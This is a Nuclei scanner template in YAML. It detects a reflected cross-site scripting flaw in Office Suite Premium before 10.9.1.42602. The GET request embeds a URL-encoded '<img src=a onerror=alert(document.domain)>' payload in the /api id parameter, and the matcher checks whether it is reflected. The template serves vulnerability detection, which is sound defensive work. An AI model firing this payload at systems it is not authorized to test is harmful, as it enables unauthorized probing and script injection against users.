http:
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(content_type, "text/html")
    - contains_all(body, "<img src=a onerror=alert(document.domain)>", "\"payload\":")
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/api?path=files&id=dfsse%3Cimg%20src%3da%20onerror%3dalert(document.domain)%3Ez1668cyj2pi&revision=%22%22&type=%22thumb%22&command=url&expires=1687785968527'
id: office-suite-xss
info:
  author: r3Y3r53
  description: 'Office Suite is suffering from an XSS vulnerability in the following
    parameter /api?path=files&id. Attackers often initiate an XSS attack by sending
    a malicious link to a user and enticing the user to click it.

    '
  metadata:
    max-request: 1
    verified: true
  name: Office Suite Premium < 10.9.1.42602 - Cross-Site Scripting
  reference:
  - https://www.exploitalert.com/view-details.html?id=39632
  severity: medium
  tags: xss,office,suite
